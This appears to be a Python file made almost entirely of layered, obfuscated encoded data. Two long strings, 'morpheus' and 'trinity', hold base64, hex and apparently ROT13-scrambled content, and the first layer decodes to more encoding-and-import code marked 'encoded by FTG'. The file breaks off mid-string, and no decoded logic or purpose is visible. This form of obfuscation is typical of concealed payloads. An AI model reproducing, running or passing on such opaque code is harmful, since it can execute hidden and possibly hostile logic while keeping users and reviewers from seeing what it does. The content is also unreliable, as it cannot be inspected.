
import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDc2NDY3NTUwMzY2YjcxNTg0YTY2NzEyYjcwNjYzMDY2NTA3MTZiNjY2NDcwNTczNjY0NGY1MTRjNWE0MzJiNmI1NTc5MzA0NjMyMzc2Mzc3NDQ2YjY4NjY2NzRkNTM3MTQ2Mzk0YjRjNjQ0NzRhNmE1OTJmNGQ2YzY5NjUzMTY2MzMzMzUwNGQ1OTRmMzI3MTcyMzc3MjM2MzY0NDdhMzA3Nzc4NDk0YTQ0NzM2NDZjNTg3MzYxNjM0ZDMyNGM0NTJiNmQzOTJmNGYzNzU4NDYzOTY1NjY3MDM1MzkyZjY1NzgzOTM5MmYyYjMyMzkyZjM4N2E0YzJmMzkzOTM5MmIyZjJiMzM2MzY0NGU2NjYyMzEzOTJmNjU2YTMzMzgyZjc2NjM3YTJiMzU1NzM5NmY1NTY2N2EzOTM5MzkyYjYxMzYzNjMzMzc1MDRlMzMyZjJmNzI2NDJmMmY2NDczNjY2MzZjNzg2NTMzNzA3NjMxNjQyYjM3NzY2MTc1NmQ0ODYzNzk2NTJiNTY3NDRjNGU3NDM4NmU0NDU3NDQ2Yzc4MzEzNzMyMmY0YzYyMmI0YzRlNjkzNDUwNmE1NDY2NmMzMjYzNDc0OTJmNmM3OTJiNzY1MDc1NTg0ZDMzMzE1NzM3MzE1YTc5NGY2NDZhNzEzNzJmNTI2NTM5MzAzNzUwNDQzOTYxNmM2ZjMzNjUyYjMzNzUzMzc3NjM2NjUyMzM1YTZhNDc0YjY4NjY3OTdhNzM0ZTVhNWEzODcyNmQ2NTYxNmU3Njc0NDg0NTc3MzE3NTY2NTkzNjMyN2EzNDU1NzQ1NDM1NTU2ODdhNmMzOTU0NzY1MjM5NzQ3MDM1NjkzNDM1NDM3MDJiNTQ3MTU0MzA3OTVhNGM3YTZkNzYyZjU5NGIzMjZlNzM0NjZjNmU0ZTQ1NGEzMTRkNGU1YTJiNjI0YjZiNzM1MDRiMzg3YTQ2MmIzMzRkNzQ2MjJiNmMyZjcwNGE0YjU0NTk0YzM2NmE0ZjMxMzE0YTUzMzE1NjcxNTg0ODc0NDY0MTYxMzk0ZDM2MzA2MjYxNTI3NzZkNjE2YzY1NTY3NDcwNzEzMjZhMmY1ODZiNDc2ZDc2NzU3ODdhNTUzMjU3NTgzNTY1NGYzOTRjNGI3MTJiNTI0MzJmNTY0MjJmNDIzMzUwNjQzMDRmNjQ1NTZhNDc3NjRjNzA2NjQ4NzA3Mzc5NzI0ZTZhNTk1MDMzNDQ3NDUxMzM3NDYyNjQ2MzU1N2E2ZDQ4Njc2NDM2NjIzMTZjNGU2NTcyMzc1MDYxNzA0ODYyNTQzMjZjNDg1Nzc4Njk2ZTZkNGU0ZTJmNzg1NTQyNTY3YTMxNTI3OTZmMzMzODRhNjM1NDc3NzI3YTZmNTQ1NzZmNGQ2MTM5NmY0ODU5MzI0YzM5NjE1MDM5NzA0NDQ5Mzg3MDMzMzQ2MzU3NmQ0ZTU3NTQ3NjU0NGM2ZjQzNjI3MTcxMzk3MjRmNDY0YzY1NmU2NTU0NjU1OTY4MzU3MTc0NzMzODRjNjE1YTRhNDE0NjM1NDk0NDMxNDY3NTZhNzY3NjRiMzY1NTcyNTQ0NDUwNzk1YTMwNTUzOTU1MmY3NjU3NTk2NTczNGQ0NzY5NzQ0NjZhMzI2MjcyMzUzMDUzMmY1NzRlNjQzOTY5NjI2MjU3NmQ3MTcxNjE1ODM3NGI2NzRiNzg0OTZlNmU1MDMwNzIzMDZhNjU0ZTQ2MmY3MTVhMzI3NDZhNjY0NDU2NTI3NjM2NTE1MDJiNzQ3NDU3NGE0NDJiNTM0NDJmNzE2YzM5NjE0ZTJmNjU2YjM3NzI2Zjc0Mzk3MDZlNTA3OTc5NzA2YzM5NDk3YTY3NjI0NzMzMzI1MzM3N2EzMzU1NTQ3MzMxNzk2ZjZlNWE0NjZlNjU1MDM5NDEyYjY5NGIzNTU2NTQ0ODMxNTIzNTJiNTQ0YTQ0NmU1Mjc1NzA3YTQzNzk3MjRkNzQzNjYzNTU2YzJmNTI2NDM2NGM0MjcwNmU1MDU3MzE0YTMzNjg2YTcyNTE1MDUwMzk1MzY2NjE3OTRhNTQzMDY0NTM0YTJmNTE0MTMzMzM1MzRmNzk3OTUwNGE2OTVhMzkzMDJmNjk2Yjc2Mzc1NTQ0NzU1NzM3NTI0YTM2Mzk2YTQ0NjI3MzY3NzY2MTc3NjQzMjQyNjY3MjZlNTc1MjY1NmIzMTM1N2EzNjY5MzgzMjY0NjY3NTQ0NzM1OTQ1NGY3OTUwMzY2ZjU4MmY3MTQ1MmY0MTc2NzU2NDJiNGY1MTQ4NTUzMTYyNGM2NjY2NzA0MTRjNzU1OTMwNTg3MjUyNGMyYjZkNDczMzdhNDY2ODcwN2E1NDQ4NmI2NTc5NTIzOTQ1NDM3OTZlNDc2ZjZhNjQzMjRhNzI3NjU4NjUzMTJmNjY2ZjRiNjM2ODJmNDk1ODc1NjczOTc0NGE0ZjU5NDgzNzMzNzIzMDcwNzI0YTQ0Mzc0YTM2MzA2YTVhNTA1OTMyNmM2MjcwNjMzODc0MzY1MjQ2MzkzMDJmNzU1MTQ5MmI3NzZkNjc3OTc3Njc3NTM5NDkyYjVhNDU2ZDRlNjU1Nzc3Nzk1NzczNTA2YjZiNmM3YTU2NjczOTVhNGM2Njc4NjM1MDM2NDk0NDU3NDM1Mjc1Njk2NDU1NDg2NjcyNzA1ODQ0N2E2OTcwNjE0NjJiNTMzODc4MzM2NTUzNmMzNjM5NDk2NjZhNTIzMzJiNmU2NTU5NTM0NjM4NTY3MjMzNjM0ZjY2Nzk0YjJmNDk2YTJiNzI2MjY1NTg0MTU0Njc3MTc5MzI3OTMzMzg2NDQ2NGEzNDRjMzU0ZjUxNGYzMzMyNTg1YTQ0MzgzMDVhMmI3MTY2Mzc0ZDQzNjk2NDVhNDcyYjM2NTI0ZDMyNjc1ODU3NTE1MDYxMzM2ODVhMzk1NDQ4NDE2NjYyNzQ3ODdhNTI3NjczNmE0ZTM2NTI3NTUwNGQ1MzQ2Mzk2YjU0MzE3NjZmMzEzMTUzNzc2MjMyNzA0NDJmNmE1NzUxNTg2NDQ0Mzc0ZDY1Nzc2MjJmNTEzNzZiNzgyZjQzNzI1MTY1NzU1ODM5NDc0MjQyNjI3NjQxNDg2ZDcyNzU3YTcwNjI1ODU3NDY3NTczN2E0NTc5NTE1MDRlNjQ0YjM2NTQ1MTU4MzkyYjQ0NDg3MzMyNjE1YTMxNzc3MzM1NDk2ZTZjNzU0YzJiMzI2YjU1MzY1MzU2NzY2MTRlNzk0YTJmNGE1NDZkNTM0YzY4NTE2YjU4MzI1MTQ4NTcyZjUxMzM3MDQ4NjE2Mjc5NjQzNjMzMzA2ZTRmMzA0NDQ2Mzk1NjcyNDQ1MDUwNDk3MzQ4NzI0OTJmNmQ0ZDY0NjY3NjQ2NjQ0MTRhMmI3MTc1Nzc3YTY4NzgzMjU0MzM0YzYyNWE1MDQxNTA3MjRhMmYzODMwNjE2Yjc0NmE0NTU4Nzk0OTUyMzM1MzJiNmE0YTY4NzM0ODJiNTE1NDczNmM3NTQ3MzQ3OTU4NTE3NzYxNmI1NjM1NzE2NjUxNjY3MTQyNzY2NDQxMzY0MjRmNmU2ZDM1Nzk2NjRlNzczOTdhNzc0YTM0MzE2NjZiNTMyYjU0NzY3NTY5NTQzMTZiNGUyYjM0Njc0MTZlNDM0YzY0NmY2MjRhNzE1NDZlNjcyZjMxNmUzMTY0NmY0NDMxMzM0MTc2NmI3MDM2N2E2ZTM1NDc3NDZiNmU2NjUzNjUzNzU1MmY3NzdhMzY1Njc3Mzc2MTZjNTc1MTJmMzU0NzJiNGQ3MjM0NzI0Nzc4NGM3NzRiMmI0MTMzNGE3NDU3NDEzOTc3NTA1YTZmNTA2ODYyNjI2MzMwNTgzOTc3NTkzNDcyNzc2YjJmNzk0NzJmNjc1MjMyNTE2NjcwNTczMjZiMzk0MTc5NDU2MzJiNDM3NjVhNGEyYjczNDg2NTQ1NmMzNDY5NTA2YjQyNGEyYjQ1MmY2YjRjNzM1MDRmNTIzODQ3Nzg2ZTM4NDg2NTc1NGUzMjYyNDI2MzczNzQ3OTc5NDc0YzVhNDUzOTc1NGU0MTZlMzI1MzU4NWEzMDU5NTQ3ODQyNGU3NTRiNzQ2YjY2Nzk3MTc3NzI3MjQxNDgzNDRiMzI1MDRkNDUyZjMyNTA2MzQ5NmU3NTZlMzk1MTc3NTk2NDc3NGYzNzMzNTE1MDc2NzQyZjQxNTg2Yjc2NjQzMjY3NzUzMDYzMzQ0NjM5Mzc0NjJmNWE0ZDJmNTE3NTczNWE2MzVhMzI0MTU4NmQ3NzU0MzI0YjY1NmQ0NDY0NzM2YTY0NmYzNTcwNGM2MzRhMzc2MjY1NzM2NDMyNDEzOTMyNmQ3YTU5NGM3MjY3MzkzNTQxMzkzODY1NGY0MjVhN2E2ZTVhNjI0MTM3NjM0ZDc4NGE1NTYzNjQ3MDYzNGEzNzYxMmI2YjdhMzg0ZDQ1NGY3ODQ4Nzc2ODMwNmQyZjQyNzc3OTQxNGM3NTQ4NDg0YTU3NDY1MDUwNGM0YTJmMzY0ODY4NmQ0ZDQ0MzQ0MTc0N2E0MTU3MmYzMzMwNDEzMzc0NDI3YTMwNmQ2NjQ0NzU3MjQyNjczNzMzNmM0NjYzNmQ1YTM4NDE1MzM2NTM1ODc1Njk1NDM4NGQ0NTY3NTA2NDQ1Mzg1MzY0MzU3MzQyNzc1ODY5Mzc0MTUzMzg3MDUwNTY1NDMzMzg0MTc2NDc3MjY2NDIzMzM0NmE1MjRjNzQ2YjUyN2E1YTc2NjE0ODM3NGEzNDc4NmU2ODYxNTk1YTM0NzgyZjQ3NTE0MzRjNmE0ZTc1NGY1MzM3Njg0ZTY1Nzc0NDJmNmIzMzZhNTQ0OTU0NTA0NzY5NjU0MjRlN2E1MDU5NDU2NDZkNGM0MjU0NzQ1NzZiNDE1MDUwNmIyZjUxNDQ0ODRkNjg2NzQ4Nzk1NDRjNjk1NDQ3NTM2MzQ5NjY3NzQxNmE1OTQ1NDc1NjU0NDE1NDM1NmY1MDM2MzU2NjMwMzQ2ODRlNGY1MTMwMmI2YjU4MzQ3MDYyNGU3NTdhNzk2NzUwMzc3MDM5N2E1ODM3NGE3YTQzNDQzNzRhNmU2YTUwNTA3NzYyNzM1MTMyMzQ1NDY2NGU3Nzc0Njg3MDY2NGEyZjY4NTY2MTU2NGIyZjYzMzQzMTUwNGQ2NjQ5NDk3ODRkNDM2ZTZlNDM0NTY2MmI0MjY4Nzc2YzM3NDE1NDJiNDUyZjUwNzk1NTM1NGU3YTY4MzgzNDZlNjk0YzY1NjI0ZjYzMzY1MDczNGY2NTU4NjM2NzQ0MmI0NTQ4NzI0YTZlNmM1ODZiNGM0ZTJiNTg3YTZkNDk2ZTM5NDEzNzU5NmI1NTQyMmYzNDU0MmY2YjcwN2E0OTUwMzk2OTUwMzQ2ZjQ4NmU0MjM3NzQ3MDRmNDgzODM1NjMzNzc4NDE2YTRkMzE0YjZiNmM2NTRkN2E3NzZkMzI3ODc2NDY3YTQ5NmU3NjRiNDU0OTM5Njc2YzMxNzY2ZjVhNTE0Yzc1NTU3YTc5NmYzNjQ0NzY1YTQ2NjU1YTY1NDk2ZjM2NGY0ODRiNjM3MTM2NmQzOTUzNTc2OTM0MzA0NDJmNWE2YzczNmI2MzYxNjQzOTU0MzI1NDRmNGU3MTc2NjQ1MDM0NmI0MzY2MzkzMzZhNDM3NTc3NTE2NjRhNTA2OTQ3NTg0YzYzNjQ0NzM0NDQ2NjZhNTkzNDU2MzQ3NzQ0Njg2NzYzNGU3ODMyNmI0YTM5NDE0ODY3NjYzNDRhNTc0YjczNzU1NzYyNjM0YzQ0Njc2NTQ5NmM1YTc1MzI0YzJiNDI0ZDJmNDI1ODY5Njk1NzRkNmEzMjU0NDg3OTRjNGY2ZjQ4Mzk1OTJmMmI3ODZhNjk3NDRkNzM3ODQzNTQ2OTM3NDE2NDM1NmU2ODM2NjQyZjU5NDYzMDRhMzI1ODU3NGEzOTM0NDE0ZTM4NDQzMzc5NGM3ODYzMzQ1OTZiNDc2NTczNDU2ZTZiNDIyYjc0NGE1MDU0NDc0MzYzNTk3NjMwNzg3NjZiNGQzMjUyNjY2OTRhNzY0YjZkNzAzNTM4Njg3MjZhNzI0MTQxMzg1MjRkNDc2ODY2MzU0YTU3NGE3YTUyNjY1YTQ0NjM1MjQ5Nzg2YjY1NTI2NzM2NDQ3NzQzMmI0MTM1Mzc3MDZlNzc0NzM4NzE0ODM4NTU0NjU3NGQ2MzM0NjI1MzJmNmY0MjUwNDEzNzY5NjI3MzJmMmI3NzJmN2EyYjUxNDg3ODRhNGY3MzVhNzc3MDU4NzMzNjY4NGEzMTZmNjYzODQ2NDQ2YTQ5NmU0NDY1NDk2NDc3NmE1MDRmNDQzODZiNzQ2MjQzMmI0NTRmNTk1MzZlNTkyYjMwMmY2YjYzMzg2ZDU3NDI3NTQ1MzkyYjY3Mzc3OTQ5MzU0YTQzMzU2ZTQ5NjY1MjcwMzY2ZTdhNzUzNDRhMmY3MDMzNjc0MTJmNGI3MTUxNGU3YTRmNGY1NDJmNDE2MjM5NmMyYjYxNDgzMjc5NmY3ODc2Nzc2ZTQ4NjMyYjZmNjYyYjZhNjU2ZjYyNjk3MzM4Nzc2MjRkNDIyZjZlNzQ0YTJiNzcyYjc4MmY2ZjdhNzg2NjZiMzYzNTQ1NjczNjQ5MzM2YjZhMmYzNjQ0Mzg2YTY1NDk3NjM0MzMzNzQ2Mzg1YTMzNzM1MTM2MmI1MjM4MzA3YTQ1NGY1NzQxNzkzNzQ0Mzk0NDc2NGI2NjM0NTM1MDQ1NmE2ODMzMzU2NzczNzg1ODQ4NTY2NDRiNmU2Nzc2MzE0MzJmMzc0ZDMxMzY3NzZlMmI1MTZlNDc1MTM0MzU1ODQ1NjU0OTYyNGY1MjM2NDc0NDZkNzU0ZDU2MzY1Nzc2Njk3NTQ5NmMzODQzNmU2ZDM0NDQzNzZlMzk3MzY3MmY2NzRkNTA1NjRhNmUzODY3NmE0ZjYxMzkzNzM1NmU2MzczNjQzOTVhMzc2YTQ4Nzg3NTY3NDgzNzY4NDUzNzcyMmI2ZjQ4NmE0NDJiNDE0YzJmNTIzOTM0NDI0YzRiNjYzNjY4NDQ0MjZiN2E1ODU5NDQ1NDRhNTE0NzdhNzk3NTQ0NTgzODQxNGY1NTU1NzY0MTM3Njg1ODY5NmU0YjZlNmE1MDRmNDk0YjM4NmM2YzYxNjIzMTU5NjE2MjRhNjU0NTJiMmI3MzRkMmI1MTZlNzc0MzU4NDg3NzUxNDQ2NzUyNmU2YTQ4MzI0MTU0NmU0ZjY4NGU3OTRiMzQ2NzU3Nzc2YzU0NDM0ZDM1NmI3NDM5NTU0YTc3NDI1YTcwNDg2NDM4NTA2MzRhMzk3NTRhNjk0ODRhNGE1NDdhNjU3NjU0NjY2Zjc2MzY0MjZlNmQ0MjM5NjgzODQ2MmIzMDU3NjU2OTJmNzc1MjJiNTEyZjM2NjQ1NjQyNmU1MTVhMzQ2MzM3Mzg2YTY1Njc1NDc2MzQ2ODQ4MzE3OTMzNmQyYjc3NTg2Njc1NDk0ZDYzNjg0YzRmNDMzNDU0NTY3MDU5NTk0MjMzNTU0ZDM0Njg3Mjc5NDI2NTQyNGE3MjY2NGY1NDY3NzU1MjM3Njc0YTJiNTM1MDc5NDQyZjQ5Nzg3ODMwNjc0YjY1NTE2OTU1NTQ2MzUxNzYzNjQ1NzY0OTc0Nzc2Nzc2N2E0YTM0NTg3YTQ4MzU2ZTc3NTEzODM0NTA3NjZiNzI3NzU5NGMzMzU4Mzg0ZTM0NDE0NDZlNGYzODQ0NjQzMjQzNTQ3MjQyMmY2ZjQ1NjY2YjQ4NjY2NjY2Njg3MDMyNTQ1ODdhNmI0ODU4NDc3YTUzNjY0NDY2NDM1MjJmNTkzNzM4Njc2ZTMyNTkzODc5NjY1OTQ3NTA0YTJmNmI2YTJmNzE2Zjc4NjgzNTY5Mzk2MTJmNmE3NTc2NDE2YTc4NmU3NzU5Njc0ZDJmNjI1YTQyNzY3NzQ1MzY1MjY0Nzc0OTcyNGY1MjM2NmE0YTZmNTUyYjYxNjYzMzc3NGMzNTMxNTA0YjRmNTM1Mjc5NDk3MzcyNmU3MTJiMzIzMDM0NjI3MjcwNzc0NTM1NTczNDM3NjY3NTY1MzY2ODJmNmE2ZTRmMzUzMjY2Njc0ZTc0NmI0Yzc4Nzk1MDMyNTYzODVhNDg3MzZkNGY0YjczN2E2ZTczNzE2ZDQ5Mzc0ZTUyNmIzMzRkMzk0YTYyNjg1NDc5NGYyZjcyNjE1MTY4MzU1MDc0NTc0Zjc5NmU0ODUwNjYzNDUwNTE2NTM0NDQ3NjZiNjk1NDdhNzY1OTRjNDE2NjRiNDE3YTU2NjU0OTMyMzc1NTQ2NzQ3MzM3MzY2NjMyNTgyZjYyNGY2NjZmNjczNTQ0NzY2MzUwNzg0NDc2NDY3Njc5MzM1NTQ1NTk3OTYyNmQ1NzMxNDgyZjQ1MmI3MjRlNTc0ZjYzNDQ3MTQ0NTc0MTU1MzQ2OTRjNzE0MTc0Mzg2OTZlNzM0ZjJiNTIzMzU4MzU1OTY3NGMzMDQ0NjQ3NzQzNGM2NzQ3MzM0MzY2Mzc1YTc3Nzc3Njc5NjIyZjc5Njk2ZTMwNGUzODU5NDg3YTdhNzc1MzM0Njk2ZTU4NGU2NDYyMzQ0ZDU4NjE0ODRmNjk2ZTU4NjQ2YjQxNDU1MDUzNGUzNjZmMzQ3YTZhNDc3Nzc1NTk2YjM1NmEzMzZlNTA2OTY2NDU0MjY1NDE2YjM0Njg2Njc5NDU0ZjUzNzY2ZTQzNjU2YTcyNjk0NTM1NDU2MjM1NGU0YTY2NDE0YzJmNmI0ODMyNzMyYjU2NjM0MzY4Njk2NzM5NjI0MzY0NzU0YzM2NDI0ODMzNGEyYjY3NmU0NTUwNzU3MzM1Nzc0NTRhNjU1MTQ2MzE0YTY0Njg2ODY4NWEyZjYzNzAyZjZiNGQzOTcxNDg0ZjQ3MzY0YTU1NGYzODc3Mzc2NzU1N2EzNTMzNDQ0ZDM5MzU3ODQ4NDg3NjZkNDk1NDQ4Njk0ODU'
trinity = 'jAQx2ZwMxZzL0MGplAzR2AGWvZmV3LGMxAmZ1ZwL4ZzV3AGEuZmt1ZmH3AGD1AQZ1Zmt1BQquZmp2BGEuZzV0LGMyAmV3AGExZmt3BQDmZmZ0LmDkAwH2MQEwZmp3AGHmZmx0ZGZ2ZmD2AwL0ATV2MwplA2R3BGExZmt1LGL4ZzV1BGLmAzZmZGD0AwL1LGL1Awp1BQL0AzH2BQDkAQt2AwDlAwZ0LGWvAmNmZQZ3AQp3AQDkAQD2MwH3ATL2ZmZ1Amt1BQMzAQRmAQD0AQV2BGEzATL2ZmD1ZmNmAGH5ZmZ2LmDmAGN3BQH4Zmt2BQL2ATD3AQHkZmx3ZmD2ZmR2MwEyZmL0ZwMyAwV0LwEzAQpmAGp5ZzL2AmDlZmxmBQH4AmRmAQH4AmN2MGH3AGt0LGL0AGR0MwZ0AmL3LGEyAGp3ZQH0AzDmAGDmAQtmZmMyAwD0ZGD4AQZ2AQZ1AzL1AwZ3AzR3AGD1Zmp3ZwquAQx0AQH2AmN0ZGL2AzV1BQZ2Amt0BQp4AQpmAmZ0AQD1ZQp2AGD3ZQEzZmR2AGp4A2R1Amp1AmR3LGEwAmt3LGD1AmH3BQHjZmN0BQWvAGDlMwZ3ATH2AwL2ATLmAwL2AmD1AwH4AmZ0AwHjZmN1ZwquAwx1AwMwAwZlMwZ5AQRlLwp5AQt3AmD4AJR3ZGplAzLmZmH3AmR0MwLmAzLlMwZjAGp2AGpjAzR2BQHjAmt2AwZ0ATH2ZmD3AmL0LmWvAzV0AQLmAQxmZmpmAmp2MwD3AwH1AmD0Zmx2MQHkAQR3AGZ1AQV2BQZ3AQR2MGH4AwpmBGp3AzHlLwExAQpmBQMwZmLmBGMyZmt0MQZkAQx1ZQMxAzZ3AwZ5AGLmAQquAGNmZwL5A2R2LwH0Zmt2BQH4ZmL1ZwEyZmZ0ZGZ4AmZmZGL4ZzL2LGD3AmLmZQMuAmZmAGEwAGVmAwZ0Zmp3AGD0ZmZ2MGMzZmt0MQquAwVmAmEvZmD1BQMyATD0MwL1AmDlLwD5ZmxmZmZlAwp2AwZlAmN1ZQL1AQtmZmHkAzD0AGMuZzV1AQMyAzR3ZGDkZmV2ZmHlAGRmZQp2ATL1ZQIuAQV2MGLlAGV3BQL0ZzLmZwZjAwZ2LGH1AGN2ZGH4ZmH0AGD0Amp2AwZ2AmtmAmZ0ATVmAwpkAmV1BGHkAwtmBQMwZzL1BGD5AwH2MwMxAmx0AGWzZmH0BGZmAGx3ZwZ1AzL2BQL0ZmR0ZwLmAzHmBQDmAQp0AmL2Zmt2MGplAzV2AGp3AmDmAQDlZmt2MGD0AQp0AwZkZmLlMwquAGR0MGZ2AmLmZwDmATZ3AwEuZmp3AQD1AGt2Zmp2ZzV1AQL1ZmNmAQZ3Zmt0BQWvAQZ2AwHlATR2AGp0Zmx2ZGD3Awp2AGp3ZzLmZQD0ZmL2BQD0Zmx0ZmZ3Amt1AQMyAQD3BQMyAQt1ZGLlZmV3Awp3ZzL3ZmLmAzR0LGExAGpmZGp3AwV1ZGIuZmt1BQZ3ATD2ZmL3AGDmAGWzAzLmAGZkAzL2AGIuAwZ3BGZ1AmN2ZmLlZmNlMwMzAwRmAGHkA2R3BQMzAQZ2AwpmAGLmZGZ5ZmD2LGZ1AwZlMwZjA2RmZGLlAzL3AGMxZmp0Zmp2AGV0BQLkAQD0MwD0AwR1ZwD4AGNmAmZ0ZzL2ZwL1AmLmZwZ3AzVmBGL2ZmDmZmH5AQV2MQZjAwx1ZGZ4AGDmBGHjAGpmBGZlAwt3AwEuA2R1ZGquAmpmAwHmZzL2LmpkAmx0LwL2AQx1AmpmAwV3ZGD5AJR3ZwD5A2R2BQZ5ATL1AQL1AmZmZQMwA2RmAGZ5Zmx3BQZkAmRmAQquAGD2BGD1AGL2LGpkAzV2AQp0ZmH0AGquAGp2BGLmAwH2ZGL5Amx1AGZkAmR2AGZ4AzD2ZwEwZmR1ZQZ0Zmp2LmZjZmt0ZwL5AmD3AwZmAQpmBQp4AQV2AQHmZmV3ZmWvAzH1AQquATR3AwEzAzL0BQZ3ATHmZmDkZmt3ZmD1AGL0MQL2AwZ1AmHmATV3BQZ0ZmLlLwEzA2R1ZQZ2ZmZ1ZwDkZmN1ZQpmAwR2LmZ5ZmN2ZGLkAzRmZQMyAGNmAwLlAwL0Zwp5AQVlMwH1ZmxmAGH0AwV0MGD3ZmD3AQMxAmZ0AmMxZmx3AmZkAQVmBQZ2AGLmZwMwAQVlMwp0AzD2MQH1AwZ3LGLmAGR2LGExAzH0LGWzZzLmAwZmAzHmZwL0AGHmZQD4AmZmZQWzAmZ0AGH1AGpmZQH2Awp0ZwZ1AzD3BGMzATL0AmMuAmx2BGL2AmV0AwL2ATL0LmLmA2R0MwEyAzL1AQMxAGN1ZmD3AzR0ZmZmAQV0Mwp1AzL1ZwHlAGxmZQHmA2RlLwL3ATH1ZmH0ZmN3BGH4ATV3BQD5AmVlLwMuAwH2AGquAGR3LGZ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